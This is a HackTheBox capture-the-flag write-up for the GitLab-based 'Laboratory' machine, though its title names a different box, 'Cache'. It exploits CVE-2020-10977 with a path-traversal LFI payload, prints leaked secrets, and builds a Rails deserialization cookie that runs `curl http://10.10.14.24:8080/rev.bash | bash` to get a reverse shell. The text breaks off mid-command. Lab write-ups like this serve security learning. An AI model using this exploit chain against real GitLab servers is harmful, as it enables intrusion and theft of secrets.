@@ -1,0 +1,573 @@
+<hr />
+<p>title: “HackTheBox—Cache—Writeup”
+date: 2021-08-2 18:54 +0600
+categories: [HackTheBox,Linux Machines]
+tags: hackthebox, Cache, ctf,
+image: /assets/Posts/Cache.png
+permalink: /HackTheBox—Cache—Writeup/
+—</p>
+
+<blockquote>
+  <p>Laboratory starts off with discovering an vulnerable GitLab instance running on the box. We’ll refer an HackerOne report to exploit a CVE associated with it to get Arbitrary file read vulnerability and chain it to get obtain Remote Code execution on the GitLab container. Next we make use of Gitlab rails console to manipulate active user data and gain access to admin’s private repository, where we discover an SSH key. For escalating privileges to root we exploit a SUID binary which doesn’t call <code class="language-plaintext highlighter-rouge">chmod</code> binary from it’s absolute path, we forge an malicious chmod binary, update the PATH which results it to run as root.</p>
+</blockquote>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<h3 id="masscan">masscan</h3>
+
+<p>Initial Port scanning using <code class="language-plaintext highlighter-rouge">masscan</code> and <code class="language-plaintext highlighter-rouge">nmap</code> :</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/laboratory
+→ masscan <span class="nt">-e</span> tun0 <span class="nt">-p1-65535</span> <span class="nt">--rate</span> 500 10.10.10.216 | <span class="nb">tee </span>masscan.ports
+
+Starting masscan 1.0.5 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2020-11-15 19:08:30 GMT
+ <span class="nt">--</span> forced options: <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">--randomize-hosts</span> <span class="nt">-v</span> <span class="nt">--send-eth</span>
+Initiating SYN Stealth Scan
+Scanning 1 hosts <span class="o">[</span>65535 ports/host]
+Discovered open port 22/tcp on 10.10.10.216
+Discovered open port 80/tcp on 10.10.10.216
+Discovered open port 443/tcp on 10.10.10.216
+</code></pre></div></div>
+
+<h3 id="nmap">nmap</h3>
+
+<pre><code class="language-shel">cfx:  ~/Documents/htb/laboratory
+→ nmap -sC -sV -p22,80,443 10.10.10.216
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-16 01:24 IST
+Nmap scan report for laboratory.htb (10.10.10.216)
+Host is up (0.075s latency).
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)
+|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)
+|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to https://laboratory.htb/
+443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: The Laboratory
+| ssl-cert: Subject: commonName=laboratory.htb
+| Subject Alternative Name: DNS:git.laboratory.htb
+| Not valid before: 2020-07-05T10:39:28
+|_Not valid after:  2024-03-03T10:39:28
+| tls-alpn:
+|_  http/1.1
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.61 seconds
+</code></pre>
+
+<p>Port Scan Summary :</p>
+
+<ul>
+  <li>Port 22 - SSH</li>
+  <li>Port 80 - HTTP</li>
+  <li>Port 443 - HTTPS</li>
+</ul>
+
+<p>Looking at the <code class="language-plaintext highlighter-rouge">nmap</code> results we can see TLS certificate has DNS entries <code class="language-plaintext highlighter-rouge">laboratory.htb</code> and <code class="language-plaintext highlighter-rouge">git.laboratory.htb</code> hence we add both the virtual hosts to <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+
+<h3 id="port-443--website">Port 443 : Website</h3>
+
+<p>Visiting the site on Port 80 redirects us to HTTPS website :</p>
+
+<p><img src="/assets/Laboratory/website.png" alt="website" /></p>
+
+<p>Website is titled as <strong>The Laboratory</strong> - Cyber Security services provider</p>
+
+<p>Fuzzing through the website manually and ffuf didn’t reveal anything interesting.</p>
+
+<h3 id="port-443--gitlab">Port 443 : GitLab</h3>
+
+<p>At <code class="language-plaintext highlighter-rouge">git.laboratory.htb</code> we find an instance of GitLab community edition</p>
+
+<p><img src="/assets/Laboratory/gitlab.png" alt="gitlab" /></p>
+
+<p>Since we don’t have any creds or usernames associated with this box yet, we will use the <code class="language-plaintext highlighter-rouge">Register</code> functionality to register ourselves an account.</p>
+
+<p>The Register functionality seems to accept registrations with email domain <code class="language-plaintext highlighter-rouge">laboratory.htb</code> hence we use <code class="language-plaintext highlighter-rouge">cfx@laboratory.htb</code></p>
+
+<p><img src="/assets/Laboratory/register.png" alt="register" /></p>
+
+<p>Once logged in, under Projects -&gt; Explore projects we find an project named <strong>SecureWebsite</strong></p>
+
+<p><img src="/assets/Laboratory/explore.png" alt="explore" /></p>
+
+<p>Looking at the project contents, it appears to be source code of the <strong>The Laboratory</strong> website which doesn’t include anything sensitive.</p>
+
+<p><img src="/assets/Laboratory/source.png" alt="source" /></p>
+
+<p>Project is owned by <strong>Dexter McPherson</strong> with username <strong>dexter</strong> which could be a potential user on the box.</p>
+
+<p><img src="/assets/Laboratory/owner.png" alt="owner" /></p>
+
+<h4 id="gitlab-version">GitLab Version</h4>
+
+<p>Help page discloses GitLab’s version which is <code class="language-plaintext highlighter-rouge">GitLab Community Edition 12.8.1</code> :</p>
+
+<p><img src="/assets/Laboratory/version.png" alt="version" /></p>
+
+<h4 id="vulnerability---cve-2020-10977">Vulnerability - CVE-2020-10977</h4>
+
+<p>Searching for vulnerabilities associated with GitLab 12.8.1 we come across <code class="language-plaintext highlighter-rouge">CVE-2020-10977</code> which is a Arbitrary file read vulnerability.</p>
+
+<h2 id="shell-as-git">Shell as git</h2>
+
+<p>There is a <a href="https://hackerone.com/reports/827052"><strong>HackerOne Report</strong></a> which we will refer to exploit this vulnerability.</p>
+
+<h3 id="lfi">LFI</h3>
+
+<p>Step 1 : First we create two projects:</p>
+
+<p><img src="/assets/Laboratory/s1.png" alt="s1" /></p>
+
+<p>Step 2 : Next, We go to project <code class="language-plaintext highlighter-rouge">cold</code> create an issue with LFI payload in the description:</p>
+
+<p><code class="language-plaintext highlighter-rouge">![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)</code></p>
+
+<p><img src="/assets/Laboratory/s2.png" alt="s2" /></p>
+
+<p>Step 3 : After submitting the issue, use the <code class="language-plaintext highlighter-rouge">Move</code> option situated at lower right side and select project <code class="language-plaintext highlighter-rouge">fusion</code>:</p>
+
+<p><img src="/assets/Laboratory/s3.png" alt="s3" /></p>
+
+<p>Step 4 : We’ll find the file linked to the second project issue :</p>
+
+<p><img src="/assets/Laboratory/s4.png" alt="s4" /></p>
+
+<p>Clicking on it downloads the file:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/laboratory
+→ <span class="nb">cat </span>passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
+<span class="o">[</span>..SNIP..]
+git:x:998:998::/var/opt/gitlab:/bin/sh
+gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
+gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
+gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
+mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
+registry:x:993:993::/var/opt/gitlab/registry:/bin/sh -
+gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh -
+gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh -
+</code></pre></div></div>
+
+<h3 id="lfi---rce">LFI -&gt; RCE</h3>
+
+<p>The <a href="https://hackerone.com/reports/827052"><strong>HackerOne Report</strong></a> also shows how we can leverage LFI to Remote Code Execution which exploits Deserialization vulnerability inside <code class="language-plaintext highlighter-rouge">experimentation_subject_id</code> cookie.</p>
+
+<p>Step 1 : Grabbing <code class="language-plaintext highlighter-rouge">secrets.yml</code> :</p>
+
+<p>To administer RCE attack first we need to grab <code class="language-plaintext highlighter-rouge">/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</code> file which we can do by replicating the LFI attack with the follow payload:</p>
+
+<p><code class="language-plaintext highlighter-rouge">![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)</code></p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">cfx</span><span class="pi">:</span>  <span class="s">~/Documents/htb/laboratory</span>
+<span class="s">→ cat secrets.yml</span>
+<span class="c1"># This file is managed by gitlab-ctl. Manual changes will be</span>
+<span class="c1"># erased! To change the contents below, edit /etc/gitlab/gitlab.rb</span>
+<span class="c1"># and run `sudo gitlab-ctl reconfigure`.</span>
+
+<span class="nn">---</span>
+<span class="na">production</span><span class="pi">:</span>
+  <span class="na">db_key_base</span><span class="pi">:</span> <span class="s">627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59528fb35b170a1b9d5ce620bc11838</span>
+  <span class="na">secret_key_base</span><span class="pi">:</span> <span class="s">3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3</span>
+  <span class="na">otp_key_base</span><span class="pi">:</span> <span class="s">db3432d6fa4c43e68bf7024f3c92fea4eeea1f6be1e6ebd6bb6e40e930f0933068810311dc9f0ec78196faa69e0aac01171d62f4e225d61e0b84263903fd06af</span>
+  <span class="na">openid_connect_signing_key</span><span class="pi">:</span> <span class="pi">|</span>
+    <span class="s">-----BEGIN RSA PRIVATE KEY-----</span>
+    <span class="s">MIIJKQIBAAKCAgEA5LQnENotwu/SUAshZ9vacrnVeYXrYPJoxkaRc2Q3JpbRcZTu</span>
+    <span class="s">YxMJm2+5ZDzaDu5T4xLbcM0BshgOM8N3gMcogz0KUmMD3OGLt90vNBq8Wo/9cSyV</span>
+    <span class="s">RnBSnbCl0EzpFeeMBymR8aBm8sRpy7+n9VRawmjX9os25CmBBJB93NnZj8QFJxPt</span>
+<span class="pi">[</span><span class="nv">..SNIP..</span><span class="pi">]</span>
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">secret_key_base</code> value is the one in which we are interested to execute this attack.</p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="na">secret_key_base</span><span class="pi">:</span> <span class="s">3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3</span>
+</code></pre></div></div>
+
+<p>Step 2 : Replicating the GitLab CE 12.8.1 Environment</p>
+
+<p>Next, to build the Deserialization payload we need to spin off a replica of vulnerable GitLab instance. We’ll use docker to do so.</p>
+
+<ul>
+  <li>Installing docker               : <code class="language-plaintext highlighter-rouge">sudo apt install docker.io</code></li>
+  <li>Pulling Vulnerable GitLab Image : <code class="language-plaintext highlighter-rouge">docker pull gitlab/gitlab-ce:12.8.1-ce.0</code></li>
+  <li>Running Docker Image            : <code class="language-plaintext highlighter-rouge">docker run gitlab/gitlab-ce:12.8.1-ce.0</code></li>
+</ul>
+
+<p>It will take few mins to run the container to start, in a new terminal we can check the docker process and simultaneously get a shell on it.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/laboratory
+→ docker ps
+CONTAINER ID        IMAGE                          COMMAND             CREATED             STATUS                             PORTS                     NAMES
+55c5745c3e56        gitlab/gitlab-ce:12.8.1-ce.0   <span class="s2">"/assets/wrapper"</span>   29 seconds ago      Up 24 seconds <span class="o">(</span>health: starting<span class="o">)</span>   22/tcp, 80/tcp, 443/tcp   friendly_volhard
+
+cfx:  ~/Documents/htb/laboratory
+→ docker <span class="nb">exec</span> <span class="nt">-it</span> friendly_volhard /bin/bash
+
+root@55c5745c3e56:/# <span class="nb">ls
+</span>RELEASE  assets  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
+</code></pre></div></div>
+
+<p>Step 3 : Replacing <code class="language-plaintext highlighter-rouge">secret_key_base</code> in our own GitLab instance :</p>
+
+<p>Next we need to replace the value of <code class="language-plaintext highlighter-rouge">secret_key_base</code> inside <code class="language-plaintext highlighter-rouge">/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</code>
+with the one we got:</p>
+
+<p><code class="language-plaintext highlighter-rouge">secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3</code></p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">root@55c5745c3e56:/# cat /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</span>
+<span class="c1"># This file is managed by gitlab-ctl. Manual changes will be</span>
+<span class="c1"># erased! To change the contents below, edit /etc/gitlab/gitlab.rb</span>
+<span class="c1"># and run `sudo gitlab-ctl reconfigure`.</span>
+
+<span class="nn">---</span>
+<span class="na">production</span><span class="pi">:</span>
+  <span class="na">db_key_base</span><span class="pi">:</span> <span class="s">1d72fbc9d369dca31357808e440be37d793ae1f1dd526cec9bd9cac74567c3eadbb34e8cfa61aa443e3b5f374afb3a5c12f279bc2fd6e30cf675962e0805afa5</span>
+  <span class="na">secret_key_base</span><span class="pi">:</span> <span class="s">3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3</span>
+  <span class="na">otp_key_base</span><span class="pi">:</span> <span class="s">49aa7a32e98f1781455387cc636958cf8e270dd9f3caf1e7381b0d0327d255b3ab4ce9e052e2fe428fa91661a5e9a222365710bc007ef5e4bcf92cdc78639981</span>
+  <span class="na">openid_connect_signing_key</span><span class="pi">:</span> <span class="pi">|</span>
+    <span class="s">-----BEGIN RSA PRIVATE KEY-----</span>
+    <span class="s">MIIJKQIBAAKCAgEA5IsR3b8jGt7wTpQh98HqX09hpyLO+SXRwsa0eLGUL8KnY/5b</span>
+    <span class="s">KgQSQ1WW3re6g5Q534duvUltf0O3Yhk9Daq6J8bRTJX+tbOZKdGw00Qbyt9zjCf5</span>
+<span class="pi">[</span><span class="nv">..SNIP..</span><span class="pi">]</span>
+</code></pre></div></div>
+
+<p>Step 4 : Generating Payload</p>
+
+<p>Next we need to run the following command in <code class="language-plaintext highlighter-rouge">rails console</code> :</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">request</span> <span class="o">=</span> <span class="no">ActionDispatch</span><span class="o">::</span><span class="no">Request</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">env_config</span><span class="p">)</span>
+<span class="n">request</span><span class="p">.</span><span class="nf">env</span><span class="p">[</span><span class="s2">"action_dispatch.cookies_serializer"</span><span class="p">]</span> <span class="o">=</span> <span class="ss">:marshal</span>
+<span class="n">cookies</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="nf">cookie_jar</span>
+<span class="n">erb</span> <span class="o">=</span> <span class="no">ERB</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"&lt;%= `curl http://10.10.14.24:8080/rev.bash | bash` %&gt;"</span><span class="p">)</span>
+<span class="n">depr</span> <span class="o">=</span> <span class="no">ActiveSupport</span><span class="o">::</span><span class="no">Deprecation</span><span class="o">::</span><span class="no">DeprecatedInstanceVariableProxy</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">erb</span><span class="p">,</span> <span class="ss">:result</span><span class="p">,</span> <span class="s2">"@result"</span><span class="p">,</span> <span class="no">ActiveSupport</span><span class="o">::</span><span class="no">Deprecation</span><span class="p">.</span><span class="nf">new</span><span class="p">)</span>
+<span class="n">cookies</span><span class="p">.</span><span class="nf">signed</span><span class="p">[</span><span class="ss">:cookie</span><span class="p">]</span> <span class="o">=</span> <span class="n">depr</span>
+<span class="nb">puts</span> <span class="n">cookies</span><span class="p">[</span><span class="ss">:cookie</span><span class="p">]</span>
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@55c5745c3e56:/# gitlab-rails console
+<span class="nt">--------------------------------------------------------------------------------</span>
+ GitLab:       12.8.1 <span class="o">(</span>d18b43a5f5a<span class="o">)</span> FOSS
+ GitLab Shell: 11.0.0
+ PostgreSQL:   10.12
+<span class="nt">--------------------------------------------------------------------------------</span>
+Loading production environment <span class="o">(</span>Rails 6.0.2<span class="o">)</span>
+irb<span class="o">(</span>main<span class="o">)</span>:001:0&gt; request <span class="o">=</span> ActionDispatch::Request.new<span class="o">(</span>Rails.application.env_config<span class="o">)</span>
+<span class="o">=&gt;</span> <span class="c">#&lt;ActionDispatch::Request:0x00007ff69e3917b8 @env={"action_dispatch.parameter_filter"=&gt;[/token$/, /password/, /secret/, /key$/, /^body$/, /^description$/, /^note$/, /^text$/, /^title$/, :certificate, :encrypted_key, :hook, :import_url, :otp_attempt, :sentry_dsn, :trace, :variables, :content, :sharedSecret, /^((?-mix:client_secret|code|authentication_token|access_token|refresh_token))$/], "action_dispatch.redirect_filter"=&gt;[], "action_dispatch.secret_key_base"=&gt;"3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3", "action_dispatch.show_exceptions"=&gt;true, "action_dispatch.show_detailed_exceptions"=&gt;false,</span>
+<span class="o">[</span>..SNIP..]
+
+irb<span class="o">(</span>main<span class="o">)</span>:002:0&gt; request.env[<span class="s2">"action_dispatch.cookies_serializer"</span><span class="o">]</span> <span class="o">=</span> :marshal
+<span class="o">=&gt;</span> :marshal
+
+irb<span class="o">(</span>main<span class="o">)</span>:003:0&gt; cookies <span class="o">=</span> request.cookie_jar
+<span class="o">=&gt;</span> <span class="c">#&lt;ActionDispatch::Cookies::CookieJar:0x00007ff69eb70e98 @set_cookies={}, @delete_cookies={}, @request=#&lt;ActionDispatch::Request:0x00007ff69e3917b8 @env={"action_dispatch.parameter_filter"=&gt;[/token$/, /password/, /secret/, /key$/, /^body$/, /^description$/, /^note$/, /^text$/, /^title$/, :certificate, :encrypted_key, :hook, :import_url, :otp_attempt, :sentry_dsn, :trace, :variables, :content, :sharedSecret, /^((?-mix:client_secret|code|authentication_token|access_token|refresh_token))$/], "action_dispatch.redirect_filter"=&gt;[], "action_dispatch.secret_key_base"=&gt;"3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3", "action_dispatch.show_exceptions"=&gt;true, "action_dispatch.show_detailed_exceptions"=&gt;false,</span>
+<span class="o">[</span>..SNIP..]
+</code></pre></div></div>
+
+<p>Setting up the payload, Initially when I did this box I had difficulties sending reverse shell payload directly so Here I’ll curl a file <code class="language-plaintext highlighter-rouge">rev.bash</code> which contains Python reverse shell from my Web server and pipe it to bash:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">004</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="n">erb</span> <span class="o">=</span> <span class="no">ERB</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"&lt;%= `curl http://10.10.14.24:8080/rev.bash | bash` %&gt;"</span><span class="p">)</span>
+<span class="o">=&gt;</span> <span class="c1">#&lt;ERB:0x00007ff699607498 @safe_level=nil, @src="#coding:UTF-8\n_erbout = +''; _erbout.&lt;&lt;(( `curl http://10.10.14.24:8080/rev.bash | bash` ).to_s); _erbout", @encoding=#&lt;Encoding:UTF-8&gt;, @frozen_string=nil, @filename=nil, @lineno=0&gt;</span>
+</code></pre></div></div>
+
+<p>Here next two commands tries to fetch the file and run the payload here itself, so we shouldn’t run the webserver while executing these commands, also In case you are sending reverse shell payload directly then it’s advised not to run the listener while sending these commands:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">005</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="n">depr</span> <span class="o">=</span> <span class="no">ActiveSupport</span><span class="o">::</span><span class="no">Deprecation</span><span class="o">::</span><span class="no">DeprecatedInstanceVariableProxy</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">erb</span><span class="p">,</span> <span class="ss">:result</span><span class="p">,</span> <span class="s2">"@result"</span><span class="p">,</span> <span class="no">ActiveSupport</span><span class="o">::</span><span class="no">Deprecation</span><span class="p">.</span><span class="nf">new</span><span class="p">)</span>
+  <span class="sx">% Total </span>   <span class="o">%</span> <span class="no">Received</span> <span class="o">%</span> <span class="no">Xferd</span>  <span class="no">Average</span> <span class="no">Speed</span>   <span class="no">Time</span>    <span class="no">Time</span>     <span class="no">Time</span>  <span class="no">Current</span>
+                                 <span class="no">Dload</span>  <span class="no">Upload</span>   <span class="no">Total</span>   <span class="no">Spent</span>    <span class="no">Left</span>  <span class="no">Speed</span>
+  <span class="mi">0</span>     <span class="mi">0</span>    <span class="mi">0</span>     <span class="mi">0</span>    <span class="mi">0</span>     <span class="mi">0</span>      <span class="mi">0</span>      <span class="mi">0</span> <span class="o">--</span><span class="p">:</span><span class="o">--</span><span class="p">:</span><span class="o">--</span> <span class="o">--</span><span class="p">:</span><span class="o">--</span><span class="p">:</span><span class="o">--</span> <span class="o">--</span><span class="p">:</span><span class="o">--</span><span class="p">:</span><span class="o">--</span>     <span class="mi">0</span><span class="ss">curl: </span><span class="p">(</span><span class="mi">7</span><span class="p">)</span> <span class="no">Failed</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">14.24</span> <span class="n">port</span> <span class="mi">8080</span><span class="p">:</span> <span class="no">Connection</span> <span class="n">refused</span>
+<span class="o">=&gt;</span> <span class="s2">""</span>
+
+<span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">006</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="n">cookies</span><span class="p">.</span><span class="nf">signed</span><span class="p">[</span><span class="ss">:cookie</span><span class="p">]</span> <span class="o">=</span> <span class="n">depr</span>
+<span class="no">DEPRECATION</span> <span class="no">WARNING</span><span class="p">:</span> <span class="vi">@result</span> <span class="n">is</span> <span class="n">deprecated!</span> <span class="no">Call</span> <span class="n">result</span><span class="p">.</span><span class="nf">is_a?</span> <span class="n">instead</span> <span class="n">of</span> <span class="vi">@result</span><span class="p">.</span><span class="nf">is_a?</span><span class="o">.</span> <span class="no">Args</span><span class="p">:</span> <span class="p">[</span><span class="no">Hash</span><span class="p">]</span> <span class="p">(</span><span class="n">called</span> <span class="n">from</span> <span class="n">irb_binding</span> <span class="n">at</span> <span class="p">(</span><span class="n">irb</span><span class="p">):</span><span class="mi">7</span><span class="p">)</span>
+  <span class="sx">% Total </span>   <span class="o">%</span> <span class="no">Received</span> <span class="o">%</span> <span class="no">Xferd</span>  <span class="no">Average</span> <span class="no">Speed</span>   <span class="no">Time</span>    <span class="no">Time</span>     <span class="no">Time</span>  <span class="no">Current</span>
+                                 <span class="no">Dload</span>  <span class="no">Upload</span>   <span class="no">Total</span>   <span class="no">Spent</span>    <span class="no">Left</span>  <span class="no">Speed</span>
+  <span class="mi">0</span>     <span class="mi">0</span>    <span class="mi">0</span>     <span class="mi">0</span>    <span class="mi">0</span>     <span class="mi">0</span>      <span class="mi">0</span>      <span class="mi">0</span> <span class="o">--</span><span class="p">:</span><span class="o">--</span><span class="p">:</span><span class="o">--</span> <span class="o">--</span><span class="p">:</span><span class="o">--</span><span class="p">:</span><span class="o">--</span> <span class="o">--</span><span class="p">:</span><span class="o">--</span><span class="p">:</span><span class="o">--</span>     <span class="mi">0</span><span class="ss">curl: </span><span class="p">(</span><span class="mi">7</span><span class="p">)</span> <span class="no">Failed</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">14.24</span> <span class="n">port</span> <span class="mi">8080</span><span class="p">:</span> <span class="no">Connection</span> <span class="n">refused</span>
+  <span class="sx">% Total </span>   <span class="o">%</span> <span class="no">Received</span> <span class="o">%</span> <span class="no">Xferd</span>  <span class="no">Average</span> <span class="no">Speed</span>   <span class="no">Time</span>    <span class="no">Time</span>     <span class="no">Time</span>  <span class="no">Current</span>
+                                 <span class="no">Dload</span>  <span class="no">Upload</span>   <span class="no">Total</span>   <span class="no">Spent</span>    <span class="no">Left</span>  <span class="no">Speed</span>
+  <span class="mi">0</span>     <span class="mi">0</span>    <span class="mi">0</span>     <span class="mi">0</span>    <span class="mi">0</span>     <span class="mi">0</span>      <span class="mi">0</span>      <span class="mi">0</span> <span class="o">--</span><span class="p">:</span><span class="o">--</span><span class="p">:</span><span class="o">--</span> <span class="o">--</span><span class="p">:</span><span class="o">--</span><span class="p">:</span><span class="o">--</span> <span class="o">--</span><span class="p">:</span><span class="o">--</span><span class="p">:</span><span class="o">--</span>     <span class="mi">0</span><span class="ss">curl: </span><span class="p">(</span><span class="mi">7</span><span class="p">)</span> <span class="no">Failed</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">14.24</span> <span class="n">port</span> <span class="mi">8080</span><span class="p">:</span> <span class="no">Connection</span> <span class="n">refused</span>
+<span class="o">=&gt;</span> <span class="s2">""</span>
+</code></pre></div></div>
+
+<p>Finally generating cookie value:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">007</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="nb">puts</span> <span class="n">cookies</span><span class="p">[</span><span class="ss">:cookie</span><span class="p">]</span>
+<span class="no">BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kibiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBjdXJsIGh0dHA6Ly8xMC4xMC4xNC4yNDo4MDgwL3Jldi5iYXNoIHwgYmFzaGAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ</span><span class="o">=--</span><span class="n">c13c402abdc9f0aabfd22f5544ab2d713e509334</span>
+<span class="o">=&gt;</span> <span class="kp">nil</span>
+<span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">00</span><span class="mi">9</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="n">quit</span>
+</code></pre></div></div>
+
+<p>Step 5 : Execution</p>
+
+<p>Now that we have the cookie value ready we will run the <code class="language-plaintext highlighter-rouge">curl</code> command to drop us a reverse shell:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/laboratory
+→ curl <span class="nt">-vvv</span> <span class="nt">-k</span> <span class="s1">'https://git.laboratory.htb/users/sign_in'</span> <span class="nt">-b</span> <span class="s2">"experimentation_subject_id=BAhvO
+kBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5
+jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kibiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48P
+CgoIGBjdXJsIGh0dHA6Ly8xMC4xMC4xNC4yNDo4MDgwL3Jldi5iYXNoIHwgYmFzaGAgKS50b19zKTsgX2VyYm91dAY6BkV
+GOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lb
+m9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ
